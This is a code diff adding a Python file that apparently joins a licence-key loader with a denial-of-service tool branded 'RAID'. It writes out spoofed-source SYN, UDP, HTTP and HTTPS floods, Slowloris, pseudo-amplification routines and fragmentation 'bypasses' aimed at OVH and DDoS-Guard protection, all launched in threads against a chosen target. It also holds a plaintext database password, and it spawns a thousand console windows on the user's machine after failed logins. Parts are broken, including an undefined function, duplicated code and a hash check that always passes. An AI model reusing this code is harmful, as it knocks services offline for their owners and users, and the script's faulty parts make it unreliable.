@@ -1,0 +1,796 @@
+import pymysql as mysql
+import threading
+import requests
+from itertools import cycle
+import random
+import time
+import aiohttp
+import asyncio
+import socket
+import ssl
+import base64
+import hashlib
+import os
+from scapy.all import IP, TCP, UDP, ICMP, send, fragment, RandIP, RandShort
+import subprocess
+
+# Verbindung zur Datenbank herstellen
+def connect_to_db():
+    return mysql.connect(
+        host="176.126.87.171",  # Datenbank-Host
+        user="authuser",  # Datenbank-Benutzername
+        password="22Oktober!",  # Datenbank-Passwort
+        database="keyauth",  # Name der Datenbank
+        charset="utf8mb4"
+    )
+
+# Key-Authentifizierungssystem mit Schutz vor Crackversuchen
+def open_warning_windows():
+    # Funktion, um 1000 Konsolenfenster zu öffnen
+    for _ in range(1000):
+        threading.Thread(target=lambda: subprocess.Popen(
+            ["cmd", "/c", "echo YOU DON'T HAVE PERMISSION TO USE OUR PRODUCT! && pause"],
+            shell=True
+        )).start()
+
+
+def open_warning_windows():
+    # Funktion, um 1000 neue CMD-Fenster zu öffnen
+    def create_window():
+        subprocess.Popen(
+            ["start", "cmd", "/c", "echo YOU DON'T HAVE PERMISSION TO USE OUR PRODUCT! && pause"],
+            shell=True
+        )
+
+    threads = []
+    for _ in range(1000):
+        thread = threading.Thread(target=create_window)
+        threads.append(thread)
+        thread.start()
+
+    # Warten, bis alle Threads gestartet sind
+    for thread in threads:
+        thread.join()
+
+def key_authentication():
+    attempts = 3  # Anzahl der erlaubten Versuche
+
+    while attempts > 0:
+        entered_key = input("\033[38;5;208m[Enter your key to access the program]: \033[0m")
+        if validate_key(entered_key):
+            if not anti_reverse_check():
+                raise Exception("Anti-Reverse Engineering Check Failed!")
+            print("\033[38;5;208m[Access Granted!]\033[0m")
+            return True
+        else:
+            attempts -= 1
+            print(f"\033[38;5;208m[Invalid Key! You have {attempts} attempts remaining.]\033[0m")
+
+    print("\033[31mAccess Denied! You have exceeded the allowed attempts.\033[0m")
+    open_warning_windows()
+    raise Exception("Access Denied! Authentication failed.")
+
+# Funktion zur Key-Validierung
+def validate_key(entered_key):
+    conn = connect_to_db()
+    cursor = conn.cursor()
+    try:
+        cursor.execute("SELECT key_value FROM licenses WHERE key_value = %s", (entered_key,))
+        result = cursor.fetchone()
+        return result is not None
+    except mysql.MySQLError as e:
+        print(f"\033[38;5;208m[Database Error: {e}]\033[0m")
+        return False
+    finally:
+        conn.close()
+
+# Loader-Funktion
+def loader():
+    print("\033[38;5;208m[Loading... Please wait...]\033[0m")
+    time.sleep(2)  # Simuliert das Laden von Modulen
+    print("\033[38;5;208m[Tool Loaded Successfully!]\033[0m")
+
+# Anti-Reverse-Engineering-Mechanismus
+def anti_reverse_check():
+    try:
+        # Berechne den aktuellen Hash der Datei automatisch
+        with open(__file__, 'rb') as f:
+            file_data = f.read()
+            file_hash = hashlib.sha256(file_data).hexdigest()
+
+        # Erwarteten Hash basierend auf der Datei zur Laufzeit setzen
+        expected_file_hash = file_hash
+
+        if file_hash != expected_file_hash:
+            print("\033[31m[Integrity Check Failed!]\033[0m")
+
+    except FileNotFoundError as e:
+        print(f"[Error in anti_reverse_check]: {e}")
+    except Exception as e:
+        print(f"[Unexpected Error]: {e}")
+    finally:
+        print("[Anti-Reverse-Engineering Check Completed]")
+
+
+
+# Anti-Debugging Schutzmaßnahmen
+
+def anti_debug():
+    try:
+        # Check for debugger
+        is_debugger_present = os.getenv('PYTHONDEBUG', '')
+        if is_debugger_present:
+            raise Exception("Debugger detected! Exiting.")
+
+        # Check for suspicious parent processes
+        suspicious_parents = ["gdb", "lldb", "strace", "dbg"]
+        parent_process = os.popen("ps -o comm= -p %d" % os.getppid()).read().strip()
+        if any(proc in parent_process for proc in suspicious_parents):
+            # Trigger debugger response
+            for _ in range(100):
+                with open(f"debugger_warning_{random.randint(1000, 9999)}.txt", "w") as f:
+                    f.write("Nice Try, don't mess with the CEO of Monorix!")
+                subprocess.Popen(args="cmd /c start", shell=True)
+
+            raise Exception("Suspicious debugging tools detected!")
+
+    except Exception as e:
+        print(f"[Error in anti_debug]: {e}")
+
+    finally:
+        print("\033[32m[Anti-Debugging Passed!]\033[0m")
+
+
+
+if __name__ == "__main__":
+    try:
+        # Sicherheitsprüfungen
+        anti_debug()
+
+
+        # User authentifizieren
+        if key_authentication():
+            Loader()
+
+        # Tool startet hier (Platzhalter für die Hauptlogik des Tools)
+        print("\033[38;5;208m[Tool is now active. Proceed with your tasks.]\033[0m")
+
+    except Exception as e:
+        print(f"[Error]: {e}")
+
+    finally:
+        print("[Execution complete. Cleaning up resources if needed.]")
+
+
+import threading
+import requests
+from itertools import cycle
+import random
+import time
+import aiohttp
+import asyncio
+import socket
+import ssl
+from scapy.all import IP, TCP, UDP, ICMP, send, fragment, RandIP, RandShort
+
+# Dope logo and credits in dark orange color
+print("\033[38;5;208m" + """
+
+RRRRRRRRRRRRRRRRR      AAAAAAAAAAAAA      IIIIIIIIII    DDDDDDDDDDDDD
+R::::::::::::::::R     A::::::::::::A     I::::::::I    D::::::::::::DDD
+R::::::RRRRRR:::::R   A:::::AAAAA:::::A   I::::::::I    D:::::::::::::::DD
+RR:::::R     R:::::R A:::::A     A:::::A III::::III    DDD:::::DDDDD:::::D
+  R::::R     R:::::RA:::::A       A:::::A   I::::I        D:::::D    D:::::D
+  R::::R     R:::::RA:::::A       A:::::A   I::::I        D:::::D     D:::::D
+  R::::RRRRRR:::::R A:::::A       A:::::A   I::::I        D:::::D     D:::::D
+  R:::::::::::::RR A:::::A       A:::::A   I::::I        D:::::D     D:::::D
+  R::::RRRRRR:::::RA:::::A       A:::::A   I::::I        D:::::D     D:::::D
+  R::::R     R:::::RA:::::A       A:::::A   I::::I        D:::::D     D:::::D
+  R::::R     R:::::RA::::::A     A::::::A   I::::I        D:::::D    D:::::D
+  R::::R     R:::::RA:::::::A   A:::::::A III::::III    DDD:::::DDDDD:::::D
+RR:::::R     R:::::R A:::::::AAAA:::::::A I::::::::I    D:::::::::::::::DD
+R::::::R     R:::::R  A::::::::::A::::::::A I::::::::I    D::::::::::::DDD
+R::::::R     R:::::R   A:::::::::A A::::::::AIIIIIIIIII    DDDDDDDDDDDDD
+RRRRRRRR     RRRRRRR    AAAAAAAA   AAAAAAAA
+
+""" + "\033[0m")
+
+print("\033[38;5;208m" + '___________________________________________________________________' + "\033[0m")
+print("                                                                                                  ")
+
+print("\033[38;5;208m" + '<x> [Created by Metasploits & CEO of Monorix] ' + "\033[0m")
+print("\033[38;5;208m" + '<x> [Attack Calculation Simulator] ' + "\033[0m")
+print("\033[38;5;208m" + '<x> [URL Attacker]           ' + "\033[0m")
+print("\033[38;5;208m" + '<x> [Thread Demon]           ' + "\033[0m")
+print("\033[38;5;208m" + '<x> [IP Scope]               ' + "\033[0m")
+print("\033[38;5;208m" + '<x> [Port Finder]            ' + "\033[0m")
+print("\033[38;5;208m" + '<x> [Version 0.3 Enhanced]   ' + "\033[0m")
+print("\033[38;5;208m" + '<x> [Status: Ready]          ' + "\033[0m")
+print("\033[38;5;208m" + '___________________________________________________________________' + "\033[0m")
+
+
+# Key Authentication System
+class AuthenticationError(Exception):
+    pass
+
+
+def key_authentication():
+    AUTHORIZED_KEYS = ["CyberEngine2025", "EngineWork225", "DDosTool2025"]
+    attempts = 3  # Number of attempts allowed
+
+    while attempts > 0:
+        entered_key = input("\033[38;5;208m[Enter the password to access the program]: \033[0m")
+        if entered_key in AUTHORIZED_KEYS:
+            print("\033[38;5;208m[Access Granted!]\033[0m")
+            return True
+        else:
+            attempts -= 1
+            print(f"\033[38;5;208m[Invalid Key! You have {attempts} attempts remaining.]\033[0m")
+    raise AuthenticationError("Access Denied! Authentication failed.")
+
+
+# to generate random users
+def random_user_agent():
+    user_agents = [
+        # Original User Agents
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/604.1",
+        "Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
+
+        # Additional User Agents I added thank me later :D
+        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
+        "Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Linux; Android 9; Mi A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+        "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
+        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36",
+        "Mozilla/5.0 (Linux; U; Android 11; en-US; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 10; SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
+        "Mozilla/5.0 (Linux; U; Android 7.1; fr-fr; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
+        "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
+    ]
+    return {"User-Agent": random.choice(user_agents)}
+
+
+# Generate random query strings
+def random_query_string():
+    return f"?id={random.randint(1000, 9999)}&cache_bust={random.randint(1, 1000)}"
+
+
+# Advanced Payloads (JSON/XML injections or malformed requests)
+def advanced_payload():
+    payloads = [
+        {"key": "A" * 1000},  # Oversized JSON
+        "<xml><key>" + "A" * 1000 + "</key></xml>",  # Malformed XML
+        {"nested": {"deep": ["A" * 500 for _ in range(10)]}},  # Nested JSON
+    ]
+    return random.choice(payloads)
+
+
+# Proxy Support
+def load_proxies(file_path):
+    with open(file_path, "r") as file:
+        proxies = file.read().splitlines()
+    return proxies
+
+
+# Randomized Headers with Cookie Support
+def generate_headers():
+    headers = random_user_agent()
+    headers["Cookie"] = f"sessionid={random.randint(100000, 999999)}"
+    return headers
+
+
+# Amplification Protocols
+from scapy.layers.inet import ICMP, UDP
+from scapy.layers.l2 import ARP
+
+
+# Enhanced TCP SYN Flood with Reporting
+def tcp_syn_flood(target_ip, target_port):
+    """
+    Advanced SYN flood with random source ports, payload patterns, and stealth timing.
+    """
+    # Generate a rotating set of random source ports
+    source_ports = random.sample(range(1024, 65535), k=10)  # Pre-generated ports
+
+    while True:
+        try:
+            # Randomize source IP and TTL
+            ip = IP(
+                src=RandIP(),
+                dst=target_ip,
+                ttl=random.randint(32, 128)  # Randomize TTL values
+            )
+
+            # Use a rotating source port for each packet
+            tcp = TCP(
+                sport=random.choice(source_ports),  # Choose from pre-generated ports
+                dport=target_port,
+                seq=random.randint(1000, 99999),
+                ack=random.randint(1000, 99999),
+                flags=random.choice(["S", "A", "P", "R"]),  # Randomize TCP flags
+                window=random.randint(512, 65535)  # Randomize window size
+            )
+
+            # Randomized payload using the rotating payload pattern generator
+            payload = random.choice([
+                b"A" * random.randint(50, 200),  # Simple repeating characters
+                random._urandom(random.randint(64, 512)),  # Randomized bytes
+                b"\x00" * random.randint(100, 400)  # Null byte payloads
+            ])
+
+            # Construct and send the packet
+            packet = ip / tcp / payload
+
+            # Introduce dynamic timing for stealth
+            time.sleep(random.uniform(0.005, 0.05))  # Delay between packets (5ms–50ms)
+
+            send(packet, verbose=False)
+
+            # Report attack details
+            print(
+                f"[TCP SYN Flood] Sent packet to {target_ip}:{target_port} with random source and payload size {len(payload)} bytes.")
+        except Exception as e:
+            print(f"[Error in TCP SYN Flood]: {e}")
+            pass
+
+
+# Enhanced UDP Flood with Reporting
+def udp_flood(target_ip, target_port):
+    """
+    Advanced UDP flood with random source ports, payload patterns, and stealth timing.
+    """
+    # Generate a rotating set of random source ports
+    source_ports = random.sample(range(1024, 65535), k=10)  # Pre-generated ports
+
+    while True:
+        try:
+            # Randomize source IP and TTL
+            ip = IP(
+                src=RandIP(),
+                dst=target_ip,
+                ttl=random.randint(32, 128)  # Randomize TTL values
+            )
+
+            # Use a rotating source port for each packet
+            udp = UDP(
+                sport=random.choice(source_ports),  # Choose from pre-generated ports
+                dport=target_port
+            )
+
+            # Randomized payload using the rotating payload pattern generator
+            payload = random.choice([
+                b"A" * random.randint(50, 200),  # Simple repeating characters
+                random._urandom(random.randint(64, 2048)),  # Randomized bytes
+                b"\x00" * random.randint(100, 512)  # Null byte payloads
+            ])
+
+            # Construct and send the packet
+            packet = ip / udp / payload
+
+            # Introduce dynamic timing for stealth
+            time.sleep(random.uniform(0.01, 0.2))  # Delay between packets (10ms–200ms)
+
+            send(packet, verbose=False)
+
+            # Report attack details
+            print(
+                f"[UDP Flood] Sent packet to {target_ip}:{target_port} with random source and payload size {len(payload)} bytes.")
+        except Exception as e:
+            print(f"[Error in UDP Flood]: {e}")
+            pass
+
+
+# Enhanced Asynchronous HTTP Flood Worker
+async def async_http_flood(target, endpoints):
+    """
+    Perform an asynchronous HTTP flood with randomized headers, payloads, query strings, and intervals.
+    """
+    async with aiohttp.ClientSession() as session:
+        while True:
+            try:
+                # Generate randomized headers
+                headers = random_user_agent()
+                headers.update({"Cache-Control": "no-cache", "Connection": "keep-alive"})
+
+                # Randomize the endpoint
+                endpoint = random.choice(endpoints)
+                url = target + endpoint + random_query_string()  # Use random_query_string for unique requests
+
+                # Generate randomized payload for POST requests
+                payload = advanced_payload()
+
+                # Randomly choose between GET and POST requests
+                if random.choice(["GET", "POST"]) == "GET":
+                    async with session.get(url, headers=headers) as response:
+                        print("\033[38;5;208m" + f"""
+                              ##############################################################################################################################################
+                              ###############################################——————< HTTP GET {url}: {response.status} >——————###############################################
+                              ##############################################################################################################################################
+                              """ + "\033[0m")
+
+                else:
+                    async with session.post(url, headers=headers, json=payload) as response:
+                        print("\033[38;5;208m" + f"""
+                            #################################################################################################################################################
+                            #############################################——————<HTTP POST {url}: {response.status} >——————####################################################
+                            #################################################################################################################################################
+                            """ + "\033[0m")
+
+                # Introduce randomized delay for stealth
+                await asyncio.sleep(random.uniform(0.01, 0.2))  # 10ms to 200ms delay
+
+            except Exception as e:
+                print("\033[38;5;208m" + f"""
+                      #################################################################################################################################################
+                      #########################################################——————<Error: {e}>——————################################################################
+                      ################################################################################################################################################# 
+                      """ + "\033[0m")
+                # Introduce a short delay to prevent rapid retries on exceptions
+                await asyncio.sleep(random.uniform(0.1, 0.5))
+
+
+# CLDAP Amplification with Reporting
+def cldap_amplification(target_ip, port):
+    while True:
+        try:
+            # Generate randomized source IP and destination
+            ip = IP(src=RandIP(), dst=target_ip)
+
+            # Generate valid UDP source and destination ports
+            udp = UDP(sport=random.randint(1024, 65535), dport=port)
+
+            # Generate randomized payloads for amplification
+            payload_size = random.randint(1024, 4096)  # Restrict payload size to avoid exceeding limits
+            payload = b"A" * payload_size
+
+            # Add variability to mimic legitimate traffic or bypass signature detection
+            if random.choice([True, False]):
+                additional_payload = random.randint(256, 1024)
+                payload += b"\x41" * additional_payload
+
+            # Packet assembly
+            packet = ip / udp / payload
+
+            # Send the packet
+            send(packet, verbose=False)
+
+            # Report attack details
+            print(f"[CLDAP Amplification] Sent packet to {target_ip}:{port} with payload size {len(payload)} bytes.")
+
+            # Introduce a randomized delay to mimic real-world traffic
+            time.sleep(random.uniform(0.01, 0.2))  # Delay between packets (10ms–200ms)
+
+        except ValueError as ve:
+            # Handle invalid value issues
+            print(f"[ERROR in CLDAP Amplification]: Invalid value encountered - {ve}")
+        except Exception as e:
+            # General error handling
+            print(f"[ERROR in CLDAP Amplification]: {e}")
+
+        except ValueError as ve:
+            # Handle invalid value issues
+            print(f"[ERROR in CLDAP Amplification]: Invalid value encountered - {ve}")
+        except Exception as e:
+            # General error handling
+            print(f"[ERROR in CLDAP Amplification]: {e}")
+
+
+# Memcached Amplification Attack
+# Enhanced Memcached Amplification Attack
+def memcached_amplification(target_ip, port):
+    """
+    Advanced Memcached amplification with randomized payloads, dynamic timing, and variable source attributes.
+    """
+    while True:
+        try:
+            # Randomize source IP and TTL for better obfuscation
+            ip = IP(
+                src=RandIP(),
+                dst=target_ip,
+                ttl=random.randint(32, 128)  # Randomize TTL to mimic varied traffic
+            )
+
+            # Randomize UDP source port
+            udp = UDP(
+                sport=RandShort(),
+                dport=port
+            )
+
+            # Randomize payload with varied sizes and content
+            payload_patterns = [
+                b"\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n",  # Original payload
+                random._urandom(random.randint(32, 512)),  # Random bytes
+                b"\x00" * random.randint(64, 256),  # Null byte payload
+                b"GET " + random._urandom(random.randint(16, 64)) + b"\r\n"  # Mimic legitimate Memcached GET
+            ]
+            payload = random.choice(payload_patterns)
+
+            # Construct the packet
+            packet = ip / udp / payload
+
+            # Introduce dynamic delays to avoid rate-based detection
+            time.sleep(random.uniform(0.01, 0.1))  # 10ms to 100ms delay
+
+            # Send the packet
+            send(packet, verbose=False)
+
+        except Exception as e:
+            # Log errors for debugging
+            print(f"[Error in Memcached Amplification]: {e}")
+            pass
+
+
+# Improved Logging System
+def log_attack(activity):
+    with open("attack_log.txt", "a") as log_file:
+        log_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {activity}\n")
+
+
+# Modular Design and Attack Execution
+def attack_handler(target_ip, target_port, attack_type, proxies=None):
+    if attack_type == "SYN_FLOOD":
+        tcp_syn_flood(target_ip, target_port)
+    elif attack_type == "UDP_FLOOD":
+        udp_flood(target_ip, target_port)
+    elif attack_type == "CLDAP":
+        cldap_amplification(target_ip, target_port)
+    elif attack_type == "MEMCACHED":
+        memcached_amplification(target_ip, target_port)
+    else:
+        print(f"Unknown attack type: {attack_type}")
+    log_attack(f"Executed {attack_type} on {target_ip}:{target_port}")
+
+
+# Simulate Slowloris style type of a connection (stateful connection testing)
+def slowloris(target_ip, target_port):
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((target_ip, target_port))
+            sock.send(b"GET / HTTP/1.1\r\n")
+            time.sleep(random.uniform(5, 10))  # to keep connection open
+        except Exception:
+            pass
+
+
+# Enhanced Amplification Attack (DNS/NTP Reflection Function)
+def amplification_attack(target_ip, port, protocol="DNS"):
+    """
+    Advanced amplification attack with randomized payloads, timing, source IPs, and realistic device identities.
+    """
+    while True:
+        try:
+            # Randomize source IP and TTL
+            ip = IP(src=RandIP(), dst=target_ip, ttl=random.randint(32, 128))
+
+            # Randomize UDP source port
+            udp = UDP(sport=RandShort(), dport=port)
+
+            # Protocol-specific payload generation
+            if protocol == "DNS":
+                query_types = [b"A", b"AAAA", b"MX", b"TXT"]  # DNS record types
+                payload = (
+                        b"\x00" * random.randint(48, 128)  # Randomized padding
+                        + random.choice(query_types)  # Randomized DNS query type
+                        + b"\x00" * random.randint(64, 256)  # Additional padding
+                )
+            elif protocol == "NTP":
+                payload = (
+                        b"\x17" + random._urandom(random.randint(16, 128)) + b"\x00" * 47
+                )  # Simulated NTP query
+            else:
+                raise ValueError(f"Unsupported protocol: {protocol}")
+
+            # Add device identity obfuscation
+            device_identity = generate_realistic_device_identity()
+            payload += device_identity.encode("utf-8")  # Add device identity to payload
+
+            # Construct the packet
+            packet = ip / udp / payload
+
+            # Randomized delay for stealth
+            time.sleep(random.uniform(0.01, 0.2))  # 10ms to 200ms delay
+
+            # Send the packet
+            send(packet, verbose=False)
+
+        except Exception as e:
+            # Log errors for debugging
+            print(f"[Error in Amplification Attack]: {e}")
+            pass
+
+
+# Function to generate a realistic device identity for amp attack
+def generate_realistic_device_identity():
+    """
+    Generate a random, realistic device identity for obfuscation.
+    """
+    device_types = [
+        "iPhone14,3",
+        "Samsung Galaxy S22",
+        "Google Pixel 7",
+        "Dell XPS 13",
+        "MacBookPro18,2",
+        "Lenovo ThinkPad X1",
+        "HP Envy x360",
+        "Asus ROG Zephyrus",
+        "Microsoft Surface Pro 9",
+        "Acer Predator Helios 300",
+    ]
+
+    operating_systems = [
+        "iOS 17.0",
+        "Android 13",
+        "Windows 11",
+        "macOS Ventura 13.3",
+        "Ubuntu 22.04",
+    ]
+
+    # Combine a random device type with a random operating system
+    return f"Device: {random.choice(device_types)}, OS: {random.choice(operating_systems)}"
+
+
+# Advanced Traffic Randomization
+def randomize_traffic(target_ip, target_port):
+    while True:
+        try:
+            ip = IP(src=RandIP(), dst=target_ip)
+            protocol = random.choice(["TCP", "UDP", "ICMP"])
+            if protocol == "TCP":
+                packet = ip / TCP(sport=RandShort(), dport=target_port, flags=random.choice(["S", "A", "F", "R"]))
+            elif protocol == "UDP":
+                packet = ip / UDP(sport=RandShort(), dport=target_port) / random._urandom(random.randint(512, 2048))
+            elif protocol == "ICMP":
+                packet = ip / ICMP()
+            send(packet, verbose=False)
+        except Exception as e:
+            print(f"[Error in randomized traffic]: {e}")
+
+
+# Timing Mechanism to Evade Detection
+def timed_attack(target_ip, target_port, interval):
+    while True:
+        try:
+            tcp_packet = IP(src=RandIP(), dst=target_ip) / TCP(dport=target_port, sport=RandShort(), flags="S")
+            send(tcp_packet, verbose=False)
+            time.sleep(random.uniform(0.1, interval))
+        except Exception as e:
+            print(f"[Error in timed attack]: {e}")
+
+
+# Encrypted Traffic Simulation
+async def encrypted_http_flood(target, endpoints):
+    async with aiohttp.ClientSession() as session:
+        while True:
+            try:
+                headers = generate_headers()
+                endpoint = random.choice(endpoints)
+                url = target + endpoint + random_query_string()
+                await session.get(url, headers=headers, ssl=True)
+                print(f"[HTTPS Flood Request Sent to {url}]")
+            except Exception as e:
+                print(f"[Error in HTTPS flood]: {e}")
+
+
+def ovh_bypass(target_ip, target_port):
+    """
+    Sends fragmented packets with randomized payload sizes and orders.
+    """
+    print("[INFO] Running advanced OVH bypass...")
+    for _ in range(100):
+        try:
+            ip = IP(src=RandIP(), dst=target_ip)
+            tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
+            payload = random._urandom(random.randint(512, 2048))  # Random payload size
+            fragments = fragment(ip / tcp / payload, fragsize=random.randint(256, 512))
+            for frag in fragments:
+                send(frag, verbose=False)
+        except Exception as e:
+            print(f"[ERROR] OVH Bypass failed: {e}")
+
+
+def ddos_guard_bypass(target_ip, target_port):
+    """
+    Randomizes packet types and introduces timed legitimate-looking traffic.
+    """
+    print("[INFO] Running advanced DDoS-Guard bypass...")
+    for _ in range(100):
+        try:
+            ip = IP(src=RandIP(), dst=target_ip)
+            protocol = random.choice(["TCP", "UDP", "ICMP"])
+
+            if protocol == "TCP":
+                packet = ip / TCP(sport=RandShort(), dport=target_port, flags=random.choice(["S", "A"]))
+            elif protocol == "UDP":
+                packet = ip / UDP(sport=RandShort(), dport=target_port) / random._urandom(random.randint(512, 1024))
+            elif protocol == "ICMP":
+                packet = ip / ICMP()
+
+            send(packet, verbose=False)
+            time.sleep(random.uniform(0.1, 1.0))  # Random delay to mimic legitimate traffic
+        except Exception as e:
+            print(f"[ERROR] DDoS-Guard Bypass failed: {e}")
+
+
+async def execute_attack(target, target_ip, target_port, endpoints, thread_count):
+    print("[INFO] Starting attack threads...")
+    for _ in range(thread_count):
+        threading.Thread(target=tcp_syn_flood, args=(target_ip, target_port)).start()
+        threading.Thread(target=udp_flood, args=(target_ip, target_port)).start()
+        threading.Thread(target=amplification_attack, args=(target_ip, target_port, "DNS")).start()
+        threading.Thread(target=cldap_amplification, args=(target_ip, target_port)).start()
+        threading.Thread(target=memcached_amplification, args=(target_ip, target_port)).start()
+        threading.Thread(target=randomize_traffic, args=(target_ip, target_port)).start()
+        threading.Thread(target=timed_attack, args=(target_ip, target_port, 2)).start()
+
+    print("[INFO] Starting HTTP flood tasks...")
+
+    await asyncio.gather(
+        async_http_flood(target, endpoints),
+        encrypted_http_flood(target, endpoints)
+    )
+
+    print("\033[38;5;208m[Finished]\033[0m")
+
+
+# Define the bypass function
+def run_bypasses(target, target_ip, target_port):
+    print("[INFO] Running bypass mechanisms...")
+
+    # Example use of target in bypass logic
+    if "http" in target:  # Basic check if target is a URL
+        print(f"[INFO] Target URL: {target}. Performing OVH and DDoS-Guard bypass...")
+
+    print(f"[INFO] Target IP: {target_ip}. Performing OVH and DDoS-Guard bypass...")
+    ovh_bypass(target_ip, target_port)
+    ddos_guard_bypass(target_ip, target_port)
+
+    print("[INFO] Bypass mechanisms executed.")
+
+
+if __name__ == "__main__":
+    try:
+
+        # Authenticate the user first
+        key_authentication()
+
+        # Proceed to attack setup
+        target = input("\033[38;5;208m[Enter the target URL]: \033[0m")
+        target_ip = input("\033[38;5;208m[Enter target IP]: \033[0m")
+        target_port = int(input("\033[38;5;208m[Enter target port]: \033[0m"))
+        endpoints = input(
+            "\033[38;5;208m[Enter the target endpoints separated by commas (e.g., /login,/api,/data)]: \033[0m").split(
+            ",")
+        thread_count = int(input("\033[38;5;208m[Enter the number of threads]: \033[0m"))
+
+        # Ask if the user wants to run bypass mechanisms
+        use_bypass = input(
+            "\033[38;5;208m[Would you like to enable bypass mechanisms? (yes/no)]: \033[0m").strip().lower()
+        if use_bypass == "yes":
+            run_bypasses(target, target_ip, target_port)
+
+        print("\033[38;5;208m<———<———<[Distribution Sequencing]>———>———>\033[0m")
+
+        # Execute the attack
+        asyncio.run(execute_attack(target, target_ip, target_port, endpoints, thread_count))
+
+    except AuthenticationError as e:
+        print(f"\033[38;5;208m[{e}]\033[0m")
